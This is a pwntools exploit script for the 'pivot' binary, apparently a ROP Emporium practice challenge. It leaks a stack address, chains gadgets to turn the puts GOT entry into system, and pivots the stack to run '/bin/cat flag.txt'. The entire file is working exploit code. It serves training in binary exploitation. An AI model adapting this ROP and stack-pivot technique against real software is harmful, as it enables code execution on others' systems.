#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time
import sys

# Version with call rax 
# Probabelly attended version

gs='''
b *pwnme+180
c
'''
# Offset avant ecrasement de l'adresse de RBP
offset=0x20

# Set up pwntools for the correct architecture
elf =  ELF('pivot')
context.binary=elf
context(terminal=['tmux', 'split-window', '-h'])

useless_func=elf.symbols['uselessFunction']
got_foothold=elf.got['foothold_function']
plt_foothold=elf.plt['foothold_function']
got_puts=elf.got['puts']
pwnme=elf.symbols['pwnme']

# References ELF de la librairie
libelf = ELF('libpivot.so')

# Calcul de la distance entre ret2win et foothold_function
lib_foothold = libelf.symbols['foothold_function']
lib_ret2win = libelf.symbols['ret2win']
off_ret2win=lib_ret2win-lib_foothold

# Gadgets
g_leave = pwnme+181
g_poprax=0x04009bb
g_poprdi=0x0400a33
g_poprbp=0x0400808
g_addrax=0x04009c4
g_callrax=0x04006b0
g_movraxrax=0x04009c0

# Target libc offsets
# here the local libc
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc_system = libc.symbols['system']
libc_puts = libc.symbols['puts']

log.info(f"libc system offset    : 0x{libc_system:08x}")
log.info(f"libc puts offset      : 0x{libc_puts:08x}")
system_off = (libc_system - libc_puts)%2**64
log.info(f"system offset         : 0x{system_off:08x}")

io = process([elf.path])
if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)
    #io = gdb.debug([elf.path],gdbscript=gs)

io.recvuntil(b"to pivot:")
leak = io.recvline().rstrip()
print(leak)
leak = int(leak,16)
log.info(f"{leak=:x}")

# Message 1
# Version : read the GOT then call system
PL=p64(leak+0x100)      # new rbp
PL+=p64(g_poprax)
PL+=p64(got_puts)         # pop puts got entry in rax
PL+=p64(g_movraxrax)      # load the current content
PL+=p64(g_poprbp)                # pop rbp with offset with system
PL+=p64(system_off)
PL+=p64(g_addrax)                # add rax, rbp ; ret
PL+=p64(g_poprdi)                # set /bin/sh to rdi
PL+=p64(leak + len(PL) + 16 )    # /bin/sh  : here plus 2 words
PL+=p64(g_callrax)
#PL+=b"/bin/\x00"
PL+=b"/bin/cat flag.txt\x00"


io.sendlineafter(b"> ",PL)

# Message 2 : pivot
PL =b"A"*offset
PL+=p64(leak)
PL+=p64(g_leave)
io.sendlineafter(b"> ",PL)

io.interactive()

